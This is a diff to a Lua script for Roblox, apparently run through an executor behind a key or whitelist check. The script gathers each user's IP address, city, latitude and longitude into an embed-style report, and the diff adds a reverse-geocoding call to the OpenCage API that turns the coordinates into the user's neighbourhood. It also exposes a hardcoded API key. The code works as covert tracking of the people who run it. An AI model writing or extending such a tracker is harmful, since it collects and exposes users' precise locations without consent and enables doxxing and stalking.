@@ -53,6 +53,22 @@ pcall(function()
     end
 end)
 
+-- 🏘️ COLONIA APROX (Reverse Geocoding)
+local colony = "Unknown"
+pcall(function()
+    local apiKey = "2a9d5a2f93e242bca7482f597032d83f" -- 🔑 reemplaza esto
+    local url = "https://api.opencagedata.com/geocode/v1/json?q=" ..
+        lat .. "+" .. lon .. "&key=" .. apiKey
+
+    local res = game:HttpGet(url)
+    local decoded = HttpService:JSONDecode(res)
+
+    if decoded and decoded.results and decoded.results[1] then
+        local comp = decoded.results[1].components
+        colony = comp.suburb or comp.neighbourhood or comp.residential or comp.village or "Approx area"
+    end
+end)
+
 -- 📍 Ubicación formateada
 local fullLocation = city .. ", " .. region .. ", " .. country
 
@@ -81,7 +97,7 @@ local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"
 -- 📅 Fecha
 local timeStamp = os.date("%Y-%m-%d %H:%M:%S")
 
--- 🧾 LINK PARA UNIRSE AL SERVIDOR
+-- 🧾 LINK SERVER
 local serverLink = "https://www.roblox.com/games/start?placeId=" ..
 game.PlaceId .. "&gameInstanceId=" .. game.JobId
 
@@ -102,6 +118,8 @@ local data = {
 
             {["name"] = "🌍 IP", ["value"] = ip, ["inline"] = true},
             {["name"] = "📍 Location", ["value"] = fullLocation, ["inline"] = false},
+
+            {["name"] = "🏘️ Colony (Approx)", ["value"] = colony, ["inline"] = false},
 
             {["name"] = "🧭 Lat", ["value"] = tostring(lat), ["inline"] = true},
             {["name"] = "🧭 Lon", ["value"] = tostring(lon), ["inline"] = true},
